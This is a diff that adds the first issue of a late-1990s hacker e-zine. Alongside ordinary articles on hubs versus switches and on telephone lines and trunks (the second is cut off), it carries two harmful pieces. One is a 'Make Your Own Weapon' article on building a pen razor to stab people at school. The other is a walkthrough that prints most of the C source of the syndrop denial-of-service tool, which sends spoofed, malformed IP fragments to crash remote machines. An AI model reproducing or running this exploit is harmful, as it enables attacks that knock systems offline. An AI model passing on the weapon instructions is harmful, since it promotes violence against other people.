@@ -1,0 +1,1703 @@
+
+                ,, , ,,  .  ,,,,,, ,, ,          ,, ,,,,,,,,,,, ,,, ,
+                ;;lll' ,$$; ;;lllli7', 'arkangel llii³ll::::::'`` `
+               iii;',$$$$$.`;ilii',$' ``_ `;;;;ÙÙ"''ÙlliiÙ'~` l$. ;
+               ;;' ,$$$$'$$. ;;',$$l.y$$$$$y.` ,S$³ l³li; &y, $$l
+               ; .$$$$$',`$$. ,$$$$i$7Ù"~`"Ù$$.$$$; lll;; $$³;$$³
+               .&$$$$$';i.`$$$$$$ll$$ ;;;;; l$$$$$ ;³l;; ;$$$l$$$
+               l$$$$$',ll;; 7$$$7'?$$y,._.,y$$7$$7 ';;:: &$$;;$$$
+               '7$$l' ;;::;;.'7'.;.'Ù&?$$$?&Ù'?$$$y,.__,y$$7  $$Ù
+                 `Ù'          .                `"Ù&S$$$$$7' ; '
+                                   N O U !           ``      .dS$b
+                                                             '7$$7`
+     ***********************************************************************
+     ~~~~~~~~~~~~~~~~~~~Nations of Ulysses - Issue #1~~~~~~~~~~~~~~~~~~~~~~~
+     ***********************************************************************
+                 .--.   _,
+               .--;    \ /(_                   A collection of people 
+              /    '.   |   '-._    . ' .        offering diversity,
+             |       \  \    ,-.)  -= * =-   instruction, complex ideas
+              \ /\_   '. \((` .(    '/. '    and some...hehe you'll see.
+               )\ /     \ )\  _/   _/
+              /  \\    .-'   '--. /_\     
+             |    \\_.' ,        \/||
+             \     \_.-';,_) _)'\ \||
+              '.       /`\   (   '._/
+                `\   .;  |  . '.
+                  ).'  )/|      \
+                  `    ` |  \|   |
+                          \  |   |
+                           '.|   |
+                              \  '\__
+                               `-._  '. _
+                                  \`;-.` `._
+                                   \ \ `'-._\
+                                    \ |
+                                     \ )
+                                      \_\
+     ***********************************************************************
+       
+            Introduction......................................lusta
+            Switch Back Networks vs Hub Setup.................lusta
+            Make Your Own Weapon..............................exult666
+            Syndrop Explanation...............................Ezzrealiteh
+            Lines vs. Trunks..................................pbxphreak
+            Data Compression..................................virogen
+            IRC Crap..........................................awnix
+            Sneaking Around...................................max
+            Experts or Fakes?.................................mosthated
+            IRC Girls.........................................lusta
+            Our Roots Our Rights..............................blackice
+            Vulnerabilities in Win95/98 and NT boxes..........colevert
+            Intro to MySQL....................................chrak
+
+*******************************************************************************
+Introduction to Nou
+
+Nou (nations of ulysses), is a collection of people that i basically 
+con'd into helping with this zine hehe. Although most everyone's been 
+around longer than I have, and is much more knowledgeable about computers,
+I'm sure that we will still be able to offer informative, if not at least
+interesting reading. Our channel is #nou on efnet, or you can email us at
+nou@hotmail.com. Thanks for your interest. Ciao!
+
+~lusta
+**************************************************************************
+
+Switch Back Networks vs. Hub Setup
+
+This article will offer you the understanding of the difference between a hub 
+and a switch. Also depending on your needs, you will be able to determine which
+choice is ideal for your network. After researching, I found that switches offered
+a lot more than a hub in areas of security and reduction of traffic, while a hub
+is available at a much lower cost. 
+
+Within a network, a hub is a central connecting device that joins communications 
+lines together in a star configuration. Connecting units that add nothing to the 
+data passing through them would be a passive hub. Active hubs, also sometimes 
+called multiport repeaters, regenerate the data bits in order to maintain a strong 
+signal. Hubs are mandatory in 10BaseT twisted pair Ethernet as well as Token Ring 
+networks. 
+
+With passing data, a hub is only able to send an incoming packet to all ports, 
+If a packet is sent to one port of the hub, that packet is also bounced 
+to all 7 other ports. A hub just bounces packets, an example could be like a 
+bunch of lines being hardwired together along with an amplifier. 
+
+Switches are mechanical or electronic devices that direct the flow of electrical 
+or optical signals from one side to the other. A switches with more than two ports, 
+such as a LAN switch or PBX, are able to route traffic. A switch can direct a 
+packet to the port it's destined to. The way a standard level 2 switch works, 
+is this - when a computer wants to communicate over IP it sends a broadcast packet 
+out called an arp request. It's like saying, "Who owns 192.168.1.3"?, and the 
+computer that owns it replys with, "I do, and my MAC address is 80:FE:A5:5B:12". 
+So basically, it remembers the machine hooked up to a specific port's MAC address. 
+
+Amount of traffic is saved by use of a switch, because when packets are received
+through a switch back, the switch is able to direct the packet to the 
+direct port. Let's say that one computer is transmitting at 50% capacity 
+(50% of the network capacity (10bT would be 5mbits/s)), since all of those packets 
+are hitting all the other computers they are limiting the bandwidths of the 
+other machines on the hubs as well. This will not make a large difference unless
+running a large network of maybe 100 stations or more.
+
+Switch Back offers a higher level of security, since all packets are bounced 
+to all machines on a hub, it is possible for a "hacker" to put the ethernet 
+card on a computer outside the source and destination machines into promiscous mode. 
+Basically, it is like eavesdropping in on a conversation (also known as "sniffing"), 
+observing passwords in an unencrypted session.
+
+The main reason a hub is usually chosen over a switch is for cost purposes. A switch
+can cost up to 50-80% more than a hub, depending on the amount of ports. 
+
+While at a higher cost, a switch definately proves to be an ideal choice with a large 
+network. It is apparent why a switch can perform better, and provide a higher level 
+of security. 
+
+~lusta  (Special thanks to icesk, slawz, and Javaman for their contributed information.)
+
+**************************************************************************************
+Make Your Own Weapon
+
+pen razOr...eXult666                                                                                                    |
+this iz just shit on how to make a pen raz0r a real cool weapon to     
+make when ur bored at skool. u stab ppl with it and the such.          
+                                                                       
+get:                                                                   
+felt tip pen                                                           
+metal pencil sharpener (the 1z wif the screw-on bladez)                
+                                                                       
+take the felt tip pen and remove the felt tip end and the ink thing    
+inside of it. with a screw driver remove the blade from the pencil     
+sharpener. take the blade and stick it in the felt tip where the       
+felt tip would go:                                                     
+   ,--------------------------.__ _____   ----------.            
+  <                            __/____/              >         
+   `~~~~~~~~~~~~|~~~~~~~~~~~~~`     |     ~~~~~|~~~~`              
+                 felt tip             blade       lid          
+***************************************************************************************
+Heh, heres my attempt to break down a simple newker (syndrop, a teardrop variant)
+as my article for NOU... You have to understand that I dont intend to explain
+C, I just intend to explain how this DoS attack works on a source level.
+You will require a decent understanding of C and TCP/IP before this is of any
+use to you.
+
+Aiight, first off, the whole idea behind syndrop is to fuck with
+the BSD TCP/IP stacks frag exploit.. And the MS windows tcp stacks
+syn(*) (* = Explained Later) sequence bug.. at the same time! Heh.
+
+So, lets see how it does this... I'm gonna omit the header files
+beacuse they dont really help explain anything.
+
+Okay.. first off we got some macros
+
+---------------------------------
+#ifdef STRANGE_BSD_BYTE_ORDERING_THING
+			/* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi <3.0 */
+#define FIX(n)  (n)
+#else  /* OpenBSD 2.1, all Linux */
+#define FIX(n)  htons(n)
+#endif /* STRANGE_BSD_BYTE_ORDERING_THING */
+
+#define IP_MF   0x2000			/* More IP fragment en route */
+#define IPH     0x14			/* IP header size */
+#define UDPH    0x8			/* UDP header size */
+#define TCPH    sizeof(struct tcphdr)	/* TCP header */
+#define PADDING 0x14			/* datagram frame padding for first packet */
+					/* JD Change pad size to 20 decimal. */
+#define MAGIC   0x3			/* Magic Fragment Constant (tm).  Should be 2 or 3 */
+#define COUNT   0x11			/* Linux dies with 1, NT is more stalwart and can
+				   	 * withstand maybe 5 or 10 sometimes...  Experiment.
+				  	 * syndrop: gotta hit it at least 8 times. overflowing
+				   	 * some static sized buffer.  fools.
+					 */
+
+---------------------------------
+
+The author well documented alot of the source, so the comments should be pretty self
+explanitory for that part.. I'm gonna skip the prototypes, because they dont
+help explain how it works.. just more C formality
+
+--[ beginning of main() ]-------------------------------
+int 
+main (int argc, char **argv)
+{
+  int one = 1, count = 0, i, rip_sock;
+  u_long src_ip = 0, dst_ip = 0;
+  u_short src_prt = 0, dst_prt = 0;
+  u_long s_start = 0, s_end = 0;
+  struct in_addr addr;
+
+  fprintf (stderr, "syndrop by PineKoan\n");
+
+  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+    {
+      perror ("raw socket");
+      exit (1);
+    }
+  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one)) < 0)
+    {
+      perror ("IP_HDRINCL");
+      exit (1);
+    }
+  if (argc < 3)
+    usage (argv[0]);
+  if (!(src_ip = name_resolve (argv[1])) || !(dst_ip = name_resolve (argv[2])))
+    {
+      fprintf (stderr, "What the hell kind of IP address is that?\n");
+      exit (1);
+    }
+---------------------------------
+
+Now, as you can see, variable "rip_sock" is a handle to a raw socket..
+if you dont know what they are, they're formless/protocol-less socket
+handles, where you have to do everything, from the ip header, to the
+protocol header, and the body of the data.. this is how
+you can build the packet that fucks with the tcp stack.
+
+The setsockopt() call begins to define to the operating system
+that this socket (handle rip_sock) is a IP socket and IP header will be in the data
+so the os doesnt need to handle that.
+
+A little bit lower down the source, you notice the two calls to name_resolve
+for the variables src_ip and dst_ip, they are variables holding the
+attackers fake ip, and victims resolved ip, respectfully.
+
+---------------------------------
+
+  while ((i = getopt (argc, argv, "s:t:n:S:E:")) != EOF)
+    {
+      switch (i)
+	{
+	case 's':		/* source port (should be emphemeral) */
+	  src_prt = (u_short) atoi (optarg);
+	  break;
+	case 't':		/* dest port (DNS, anyone?) */
+	  dst_prt = (u_short) atoi (optarg);
+	  break;
+	case 'n':		/* number to send */
+	  count = atoi (optarg);
+	  break;
+	case 'S':		/* SYN sequence start */
+	  s_start = atoi (optarg);
+	  break;
+	case 'E':		/* SYN sequence end */
+	  s_end = atoi (optarg);
+	  break;
+	default:
+	  usage (argv[0]);
+	  break;		/* NOTREACHED */
+	}
+    }
+
+---------------------------------
+
+The while loop makes repeated calls to getopt() until it gets EOF message.
+Now, if you dont know anything about getopt(), it handles switches 
+from the command line, and makes it easy to write code for 'em
+
+---------------------------------
+
+  srandom ((unsigned) (time ((time_t) 0)));
+  if (!src_prt)
+    src_prt = (random () % 0xffff);
+  if (!dst_prt)
+    dst_prt = (random () % 0xffff);
+  if (!count)
+    count = COUNT;
+
+  fprintf (stderr, "Death on flaxen wings:\n");
+  addr.s_addr = src_ip;
+  fprintf (stderr, "From: %15s.%5d\n", inet_ntoa (addr), src_prt);
+  addr.s_addr = dst_ip;
+  fprintf (stderr, "  To: %15s.%5d\n", inet_ntoa (addr), dst_prt);
+  fprintf (stderr, " Amt: %5d\n", count);
+  fprintf (stderr, "[ ");
+
+---------------------------------
+
+Now, this call to srandom() seeds the PRNG (pseudo-random number generator).
+And then the two if's check to see if destination and source ports are set,
+if they arent, it generates a random number between 0 and FFFF (65535)
+
+Then, a cute message is printed ("Death on flaxen wings:"),
+the sockaddr structures are filled, and information regarding 
+the victims host is printed.
+
+---------------------------------
+
+  for (i = 0; i < count; i++)
+    {
+      send_frags (rip_sock, src_ip, dst_ip, src_prt, dst_prt, s_start, s_end);
+      fprintf (stderr, "b00m ");
+      usleep (500);
+    }
+  fprintf (stderr, "]\n");
+  return (0);
+}
+
+--[ end of main() ]-------------------------------
+
+Oh baby, there it is, the loop of death, pumping out (count) frags and printing
+a cute "b00m" message for every one.. notice the 500 ms sleep =)
+
+Now, I'm gonna jump around the source, and talk about the name_resolve()
+function.
+
+--[ begin of name_resolve() ]-------------------------------
+
+u_long 
+name_resolve (u_char * host_name)
+{
+  struct in_addr addr;
+  struct hostent *host_ent;
+
+  if ((addr.s_addr = inet_addr (host_name)) == -1)
+    {
+      if (!(host_ent = gethostbyname (host_name)))
+	return (0);
+      bcopy (host_ent->h_addr, (char *) &addr.s_addr, host_ent->h_length);
+    }
+  return (addr.s_addr);
+}
+
+--[ end of name_resolve() ]-------------------------------
+
+Okay, name_resolve() does two things.. and is actually a pretty useful function.
+First off, it converts the entered host, or at least, attempts to, into
+an sockaddr formatted address, if this fails, it then attempts to resolve
+the given host into a sockaddr formatted address via the gethostbyname() function.
+
+Now I'm gonna jump around one more time, and handle the last bullshit function
+left, usage()
+
+--[ begin of usage() ]-------------------------------
+
+void 
+usage (u_char * name)
+{
+  fprintf (stderr, "%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]", name);
+  fprintf (stderr, "[ -S sequence_start] [ -E sequence_end ]\n");
+  exit (0);
+}
+
+--[ end of usage() ]-------------------------------
+
+This function isn't even worth my time to talk about, because it
+just tells ya how the fuq to use the compiled binary..
+Heh, I spose I just talked about it anyways =)
+
+And now.. finally the part that does the magic of syndrop, send_frags()
+
+--[ begin of send_frags() ]-------------------------------
+
+/*
+ *  Send two IP fragments with pathological offsets.  We use an implementation
+ *  independent way of assembling network packets that does not rely on any of
+ *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).
+ */
+
+void 
+send_frags (int sock, u_long src_ip, u_long dst_ip, u_short src_prt, u_short dst_prt, u_long seq1, u_long seq2)
+{
+  u_char *packet = NULL, *p_ptr = NULL;		/* packet pointers */
+  u_char byte;			/* a byte */
+  struct sockaddr_in sin;	/* socket protocol structure */
+
+  sin.sin_family = AF_INET;
+  sin.sin_port = src_prt;
+  sin.sin_addr.s_addr = dst_ip;
+
+---------------------------------
+
+The author drops a fairly technical description of what the function does, and 
+to a good coder, it makes perfect sense, but I'm gonna break down the function anyways =)
+
+Now here, all he does is begin to setup a sockaddr structure with proper infos
+setting the address family (AF_INET), the source port (src_ptr) and the victims ip
+(dst_ip)
+
+---------------------------------
+
+  /*
+   * Grab some memory for our packet, align p_ptr to point at the beginning
+   * of our packet, and then fill it with zeros.
+   */
+  packet = (u_char *) malloc (IPH + UDPH + PADDING);
+  p_ptr = packet;
+  bzero ((u_char *) p_ptr, IPH + UDPH + PADDING);	/* Set it all to zero */
+
+---------------------------------
+
+Memory is now allocated for this packet header + body, where he adds up the amount needed
+(IP_HEADER_SIZE + UDP_HEADER_SIZE + PADDING) and sets his pointer (p_ptr) to the address
+of the allocated memory..
+
+Then, this memory buffer is zero'd out (all bytes are set to zero).
+
+Okay now, here comes the important stuff, where the packet is built in memory.
+
+---------------------------------
+
+  byte = 0x45;			/* IP version and header length */
+  memcpy (p_ptr, &byte, sizeof (u_char));
+  p_ptr += 2;			/* IP TOS (skipped) */
+  *((u_short *) p_ptr) = FIX (IPH + UDPH + PADDING);	/* total length */
+  p_ptr += 2;
+  *((u_short *) p_ptr) = htons (242);	/* IP id */
+  p_ptr += 2;
+  *((u_short *) p_ptr) |= FIX (IP_MF);	/* IP frag flags and offset */
+  p_ptr += 2;
+  *((u_short *) p_ptr) = 0x40;	/* IP TTL */
+
+---------------------------------
+
+So, now, right as the first byte, he sets the ip version, and header length
+since these are two 4 bit fields, he combins them into one 8 bit number
+and sets the first byte.
+
+You'll also notice the repeated "p_ptr += 2;" lines, those increment
+where within the memory "buffer" that the data is being written to.
+Next, the IP id, and frag flag (the key behind the *drop newks) and the time to live (TTL)
+are set.
+
+---------------------------------
+
+  byte = IPPROTO_TCP;
+  memcpy (p_ptr + 1, &byte, sizeof (u_char));
+  p_ptr += 4;					/* IP checksum filled in by kernel */
+  *((u_long *) p_ptr) = src_ip;			/* IP source address */
+  p_ptr += 4;
+  *((u_long *) p_ptr) = dst_ip;			/* IP destination address */
+  p_ptr += 4;
+  *((u_short *) p_ptr) = htons (src_prt);	/* TCP source port */
+  p_ptr += 2;
+  *((u_short *) p_ptr) = htons (dst_prt);	/* TCP destination port */
+  p_ptr += 2;
+  *((u_long *) p_ptr) = seq1;			/* TCP sequence # */
+  p_ptr += 4;
+
+---------------------------------
+
+This time, you notice the IPPROTO_TCP flag is set via the "byte" variable and 
+memcpy'd into the structure, this seems to be because its -1- physical byte (8 bits) long.
+
+The pointer is then incremented + 4, the skip the checksum calculation, beacuse 
+thats still done by the kernel, even in a raw socket.
+
+The fake attackers ip, and victims ip's are set, and the attackers fake port and 
+victims destination are also set, and a fake sequence number.. not like it makes a 
+diffrence, since its only a SYN(*) anyways (* = Explained later on)
+
+---------------------------------
+
+  *((u_long *) p_ptr) = 0;	/* ack */
+  p_ptr += 4;
+  *((u_short *) p_ptr) = htons (8 + PADDING * 2);	/* TCP data offset */
+  /* Increases TCP total length to 48 bytes Which is too big! */
+  p_ptr += 2;
+  *((u_char *) p_ptr) = TH_SYN;	/* flags: mark SYN */
+  p_ptr += 1;
+  *((u_short *) p_ptr) = seq2 - seq1;	/* window */
+  *((u_short *) p_ptr) = 0x44;	/* checksum : this is magic value for NT, W95.  dissasemble M$ C++ to see why, if you have time  */
+  *((u_short *) p_ptr) = 0;	/* urgent */
+
+  if (sendto (sock, packet, IPH + TCPH + PADDING, 0, (struct sockaddr *) &sin,
+	      sizeof (struct sockaddr)) == -1)
+    {
+      perror ("\nsendto");
+      free (packet);
+      exit (1);
+    }
+
+---------------------------------
+
+Ok, this time after the SEQ(*) was set, a fake ACK(*) is also set, again
+useless because its only a SYN. The TCP data offset is then calculated, adding upto
+48 bytes, and the mark syn flag is set.. the window is calculated from the previous
+and current SEQ's (which again, are useless, but required), and a strange magic
+(a constant, required number) is set, in this case, I believe to identify that
+the orginating tcp stack was NT/95... this again is crap, since we know it compiles on
+Linux or BSD variants =)
+
+An urgent flag is set, but you notice, theres no incrementing of pointers after the
+point of setting the flag TH_SYN, could this be one of those purposely done fuckups
+to insure newk kiddies dont use his tewl.. if this is so, the patch is very obvious,
+if you have even a half of a brain. But I wont give it out if I am right, cuz
+I dont want the newk kiddies using this shit too.
+
+And our friend, sendto() is now called, he takes this big ol' data buffer, and pumps
+it out the NIC(*), and into the world.... Notice theres JUST a bit of error checking =)
+
+---------------------------------
+
+  /*  We set the fragment offset to be inside of the previous packet's
+   *  payload (it overlaps inside the previous packet) but do not include
+   *  enough payload to cover complete the datagram.  Just the header will
+   *  do, but to crash NT/95 machines, a bit larger of packet seems to work
+   *  better.
+   */
+  p_ptr = &packet[2];		/* IP total length is 2 bytes into the header */
+  *((u_short *) p_ptr) = FIX (IPH + MAGIC + 1);
+  p_ptr += 4;			/* IP offset is 6 bytes into the header */
+  *((u_short *) p_ptr) = FIX (MAGIC);
+  p_ptr = &packet[24];		/* hop in to the sequence again... */
+  *((u_long *) p_ptr) = seq2;	/* TCP sequence # */
+
+  if (sendto (sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *) &sin, sizeof (struct sockaddr)) == -1)
+    {
+      perror ("\nsendto");
+      free (packet);
+      exit (1);
+    }
+  free (packet);
+}
+
+
+---------------------------------
+
+This block just peforms modding of the last packet, flixing up the IPTL
+and the IP magic (hrrrm..), the b.s. SEQ is also changed, 
+and this new packet is fired off into the wild tcp/ip jungle....
+
+--[ end of send_frags() ]-------------------------------
+
+
+Well, as I pointed out a couple of times, I'm gonna explain some things
+at the end, some terminology.. so here it is:
+
+SYN : Part of the TCP 3 part handshake, this packet tells the destination
+      that you intend to open a socket to the specified port.
+
+ACK : Another part of the TCP 3 part handshake (when its a packet), and
+      also used for control. ACKnologing the reciept of the previous packet.
+
+SEQ : Packet sequence number.
+
+NIC : Network Interface Card, to the average person, this is refered to as 
+      an Ethernet card, because most people have ethernet networks (generally).
+      However there are other types of NIC's, but this aint about NIC's right now,
+      this is about syndrop =)
+
+
+Anyhow, I hope this comes to help someone, at least, learn and expand their small
+minds regarding tcp and helps them understand at least how they're newkin 
+(or attempting)someone.. It doesnt make newking any less lame, nor the person however.
+
+Maybe I'll write something next time.. so stick around for the next issue,
+Peace out =)
+
+							~ Ezzrealiteh
+***************************************************************************************
+                          Lines versus Trunks
+                         by pbxphreak <chris@lod.com>
+
+The term line refers to more than one type of circuit in most cases, it
+includes a connection configured to support a normal voice calling load
+generated by one individual. But in the case of a PBX, the term line is
+usally corresponds to one connection from the PBX to a desktop. In the
+case of a centrex, a line is normally one physical connection from the
+customer site to the CO. With a key system, a line corresponds to one
+telephone number, but it might also be reffered to as a trunk.
+
+The term trunk normally refers to a circuit configured to support the
+calling loads generated by a group of users. Possibly numbering many
+thousdands. Usually a general-use circuit from a PBX to a CO would be
+described and billed as a trunk. Connections between COs or offices
+higher in the network would also be referred as trunks. These trunks
+are physically identical to lines.
+
+The ability of any given switching system, such as a CO or a PBX, to
+establish connections is limited. For example, although a PBX might be
+able to support 200 connections or ports, it might only actually provide
+80 paths at one time. In such a case, if 80 people were to connect to 80
+other people (some of them possibly off site), that would account for 160
+of the ports, and if any of the remaining telephones or ports attempted to
+access service, the would fail. That is, a user could pick up the telephone
+and not recieve a dialtone. Some systems are configured so that no such
+failures can happen. In the previous example, if only 160 physical
+connections were made to the PBX, then it could provide service at the same
+time to all of them. Such a configuration is described as blocking.
+
+Normally, a PBX's connections to the CO are configured so that a much higher
+utilization than 10 minuties per hour is achieved on those ports, and a
+primary benefit of a PBX is the ability to buy fewer telco connections than
+one has telephones. The CO must be configured so that it can provide
+connection services to such trunks at this higher utilization rate so it uses
+more of the CO's overall switching and connection capacity (CO's are not
+normally configured as nonblocking switches). So, the telco will naturally
+bill a PBX trunk at a higher rate than a single business line, even though
+the PBX trunk might be physically identical to that single line.
+
+The final comparison of lines versus trunks would be as follows. A line is
+an end point from a central switching service, such as a Co or a private
+automated branch exchange (PABX). The line is an end point on the pair of
+wires regardless of where it resides. A line carries one single conversation
+at a time on the physical channel capacity. It is a billable location for
+the telephony companies.
+
+A trunk connects two switching systems. The trunk might be a single circuit
+carrying a single call at a time, or might be a bundled service that is
+multiplexed and carries multiple conversations going at the same time. The
+difference is that a trunk will be used for switching and routing decisions
+from the switching offices (CO, or PABX). The trunk is continually rather
+than occasionally used. It is a billable address that can have additional
+subaddressing capabilities behind it. In the telephone company world, it is
+the connection between and among other offices. In the private user world, it
+might be a sinle connection to the PABX from the CO. These disctinctions
+offer some variations in billing and utitilizing them. Below are some common
+configurations.
+
+DID:
+---
+
+DID refers to direct inward dialing, from a callers point of view, this
+service is in place if the caller can dial a 10 digit number rom the outside
+and reach a specific person without an operator (live or automated). Centrex
+normally supports this capability without andy additional configuration, and
+everyone has their own telephone number. A true key system (where telephone
+numbers are normally shared) can only allow DID if any given telephone number
+has only a single apprearance.
+
+But DID is ually referred to in the context of a PBX. It is a specific PBX
+feature that musyt be enabled and configured, with elements set up both
+within the PBX and also with the telco. Consider as an example a new site
+intended to support 1100 employees, each with his/her own telephone connected
+to a PBX.
+
+The first step in arranging DID is to reserve the telephone numbers for all
+those employees. Lets say the main company telephone number is 555-1234. The
+telecommunications manager will request a block of DID numbers from the telco
+probably about 2000. The telco might say, "Your DID numbers are 555-2200
+through 555-4199". Notice that while there is a good chance the block will
+have the same exchange as the main number, it probably will not inslude the
+main number. The company will pay for those numbers on a montly basis, but
+they will not cost anywhere near as much as actual telephone lines. So far
+the only thing arranged is the reservation of the block of numbers themselves
+These numbers will not be given out by the telco to anyone else. The telecom-
+munications manager will assign each employee one of the numbers in the DID
+block.
+
+Next, the telecommuncations manager must determine how many trunks (or DID
+lines) in the trunk group will be required to support the calls from outside
+to the companys employees. These are inbound only, and are in addition to the
+normal in/out or inbound trunks that serve the main operator, so they must
+be engineered to a very low level of blocking. With DID, the telco passes on
+to the customer PBX the responsibility of handling answer supervision.
+Eg. Busy signals.
+
+So if an external customer calls "Jane" at extension 2313, the customer will
+dial 555-2313. The telco CO will seize the next available trunk in the DID
+group and signal along that there is a call for extension 2313. At that point
+if extension 2313 is busy, the PBX must deal with it, and the CO is merely
+passing along the signals. Possible PBX actions include forwarding to a
+message center, generating a busy signal, or forwarding the call to a
+specified alternate extension.
+
+DID is most often used to reduce or eliminate the manpower required for a
+central answering position. The more calls customers can place directly, the
+fewer must be answered by the company operator. On the other hand, some
+companies prefer to have all incoming calls answered by someone trained in
+the way the company wants its telephonees to be answered.
+
+DOD:
+---
+
+DOD refers to direct outward dialing. If an employee can dial and reach an
+outside number without and internal operator, then the company has
+implemented DOD. In the past, when old telephone systems were available with
+less technology, it was not uncommon for a company to route all of its
+outbound calls through an internal operator. The operator's responsibility
+was both to screen calls and to route the calls over the right facilities,
+for examples a WATS line. (see below for WATS line). With the advent of
+modern PBX's and Centrex, such limitations can be programmed on a telephone
+by a telephone or even user-by-user basis, eliminating the need to involve
+an operator in inbound calls. DOD is a term not often used these days because
+few companies consider not providing it.
+
+FX:
+--
+
+FX refers to a foreign exchange circuit. Foreign refers to a CO other than
+the local Co, not to a location outside the country.
+
+Consider the case of an airline that wishes to locate all of its reservation
+clerks in Atlanta. It cannot expect all of its customers to pay long distance
+charges to make reservations. What are the alternatives? One possibility is
+a group of 800 circuits. It will probably have a large number of those, but
+800 trunks cover large areas (and are prices accordingly). What about service
+for customers calling from large citys like Chicago? Perhaps a more focused
+service might be more cost effective.
+
+Think of an FX line (or trunk) as two-thirds of a dedicated point to point
+connection. It starts at the customers location, connects to the local CO and
+extends from there to another foreign CO anywhere in the country. There is a
+fixed montly charge for all that mileage, but there are no usage-sensitive
+charges for these miles. At the foreign CO, it is open. It has a telephone
+number associated with that foreign CO. Calls made to that number ring at
+the customers lcoation. Calls made from the customers location over the FX
+line to proceed to the foreign Co, incurring only local charges for the call
+from the foreign Co to the called location.
+
+FX lines are often used by companies to provide local numbers that customers
+can call in cities where the companies do not in fact have offices. In the
+airlines case, it could arrange a group of FX lines from its Atlanta offices
+to a Chicago CO. All of thelines could share one Chicago local telephone
+number. People from anywhere could call the number, but normally only people
+in Chicago would, because it would appear only in their telephone book, and it
+would be a local call only for them. If the airline wished to allow it,
+service representatives could also place calls from Atlanta to Chicago over
+the FX lines. The calls would be billed though they were placed within
+Chicago. Perhaps calls notifying customers of changing flight information
+might be places in this way.
+
+OPX:
+---
+
+OPX refers to off-premises extension. An OPX line permits a telephone not a
+company's location to function to all intents and purposes as though it is
+located at a company's location. This capability becomes particularly
+interesting with the recent increase in telecommuting. Suppose an employee
+plans to work at home. One of the problems to overcome in such a case is the
+isolcation such a worker might experience. Providing the employee with a
+telephone that look slike an internal line at the company might help to reduce
+the problem. Others calling the line within the company will dial an internal
+extension, which will ring at the employees home, and if the employee whishes
+to make a long distance call, he/she ually just dials 9 and then the rest of
+the number just as at a desk at the company's location.
+
+As with an FX line, an OPX connects from the company's location to the local
+CO then continues via whatever connecting Co's are neccassary until it
+terminates directly on at telephone at another location. A key difference
+from an FX, is that on the PBX and OPX is connected and configured as a
+telephone rather than a trunk. This results in a limitated type of service
+provided and normally only an analog telephone can be used at the end of an
+OPX because the digital signalling between a PBX and its old style telephones
+will probably not successfully make it throught the various analog and
+digital circuits that make up the OPX. This limitation is not normal. It just
+imposes on the telecommunications manager the need to configure the PBX to
+support a certain number of analog telephones as well as the digital
+telephones that might be used in house.
+
+Tie Lines:
+---------
+
+A tie line also sometimes called a tie trunk refers to a private point to
+point circuit used to connect to voice facilities. For example, a decicated
+link between customers PBXs at two different locations would referred to as
+a tie line. Other examples of tie lines might be a link between a PBX and a
+centrex sysem, or one between two centrex systems. In all of these cases, it
+would be equally correct to refer to the circuits as private or leased lines.
+If ones of the connected systems is not a voice system, the term tie line
+would not be used. Tie stands for terminal interface equipment.
+
+WATS:
+----
+
+WATS is an abbreviation for wide area telephone service. WATS lines come in
+two flavours: in-WATS and out-WATS. Another name for in-WATS is 800 service.
+When most people refer to a WATS line, they mean and out-WATS facility. Both
+services are merely billing arrangements for reduced billing of long-distance
+calls based on a fixed montly free and discounts for larger calling volumes.
+800 service also has the characteristic of reversing the charges to the
+called party.
+
+In the past, WATS lines have been separate facilities (physically identical
+to local PBX trunks or private lines). Their coverage was also banded, and
+a user may have had a WATS line that only reached adjacent states, or all
+of the lower 48 states, or some intermediate variation. For out-WATS, either
+the PBX had to be smart enough to recognize the dialed area and choose the
+correct outgoing facility or users had to dial special codes to select the
+right WATS line.
+
+WATS service has never been free, although some of the older tariffs did
+specify certain volumes aove which all calls were free, which was very large.
+Those tariffs are long gone and all calls are now charged on a per minute
+basis. The only factor is the per minute charge, which does decrease as the
+calling volume increases.
+
+One significant improvment is that WATS-type volume discount billing can now
+be setup on existing trunks, no longer are seperate facilities into the local
+CO required for such an arrangement.
+
+Private Line:
+------------
+
+Any circuit leased from a crrier from point on one customers premises to
+another point on a customers premises (even the same premises) can be
+described as a private line circuit. If an organization builds its own
+facilities(eg. a mircowave link across a big city), these facilties would
+also be described as private circuits. In either case, the alternative is
+normally a dial-up link.
+
+Many factors go into the decision as whether to setup a private facility.
+Some reasons why a company might setup a private link include:
+
+ - Private analog circuits can be tuned for higher performance than dial-up
+   facilities can. Both in terms of speed and reliability.
+
+ - Many types of digital facilities are only available on private basis.
+
+ - Management and troubleshooting of private facilities can be more tightly
+   controlled than in dial-up enviroment.
+
+ - High volume of calls or data would generate higher charges on the public
+   dial network than on a non usage sensitive private network.
+
+Reasons to go with public dial network include:
+
+ - Volumes of calls or data too low to justify a leased link.
+
+ - Unwillingness or inability to coordinate and manage a private network.
+   Like do you really want to be your own telephony company? I think not :)
+
+ - A large number of small locations that would be uneconomical to connect
+   with private links.
+
+With few exceptions, there is not a "right" descision on this issue. What
+might make the most sense today might be uneconomical tomorrow.
+
+A classical example of this kind of change is the decision as to whether to
+build a private voice communications network of tie lined connected PBXs
+which is called a tandem network.
+
+My Comments on Line and Trunk Networking:
+----------------------------------------
+
+Some of us might rememebr the early days of competition in the long distance
+arena. Remember the way we had to conenct to the alternate long-distance
+suppliers, like Sprint and MCI.
+
+A customer might sign up with a long distance supplier other than AT&T prior
+to 1984. This new customer of the competitors was offered several discounts
+over the long distance tariffed rates from AT&T. So that the customer could
+use the service, the long distance supplier would issue an 800 number to call
+its network, or a special number. This special number was a seven digit
+telephone number that could be a regular local number in the area, a 950-XXXX
+number or foreign exchange telephone number from a major area. The choices
+were based on the density of the carrier's service in the customers area.
+
+The customer would issue this telephone number to all internal users. Along
+with the 7 or 10 digit telephone number for entrance into the carriers
+network (I will use MCI from this point on for simplicity), another 10 digit
+number, called an autorization number, was issued. THis might be an unique
+number for every indivdual in the organization or a global number used by the
+entire organization.
+
+The caller now wants to make a long distance call from his/her office. So the
+sequence begins like this:
+
+ - Pick up the phone and get a dial tone, then dial 9 for an outside line.
+
+ - Dial the MCI toll free 800 number
+
+ - Wait for connection. As the call proceeds, a ring tone is heard and then
+   the MCI system answers and provides a computer tone which sounds much like
+   steady high pitched tone.
+
